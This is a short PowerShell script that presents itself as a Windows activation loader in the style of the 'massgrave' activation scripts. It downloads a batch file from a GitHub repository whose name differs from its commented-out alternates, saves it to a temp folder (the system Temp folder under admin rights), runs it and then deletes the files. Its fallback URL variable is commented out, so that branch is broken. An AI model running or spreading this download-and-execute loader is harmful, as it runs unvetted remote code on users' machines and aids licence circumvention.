$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

$DownloadURL = 'https://raw.githubusercontent.com/stan0ne/massgrave/main/WIN.cmd'
# $DownloadURL = 'https://gitlab.com/WINsgrave/microsoft-activation-scripts/-/raw/WINter/WIN/All-In-One-Version/WIN_AIO.cmd'
# $DownloadURL2 = 'https://raw.githubusercontent.com/WINsgravel/Microsoft-Activation-Scripts/WINter/WIN/All-In-One-Version/WIN_AIO.cmd'

$rand = Get-Random -Maximum 1000
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\WIN_$rand.cmd" } else { "$env:TEMP\WIN_$rand.cmd" }

try {
    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
}
catch {
    $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
}

$ScriptArgs = "$args "
$prefix = "@REM $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content

Start-Process $FilePath $ScriptArgs -Wait

$FilePaths = @("$env:TEMP\WIN*.cmd", "$env:SystemRoot\Temp\WIN*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
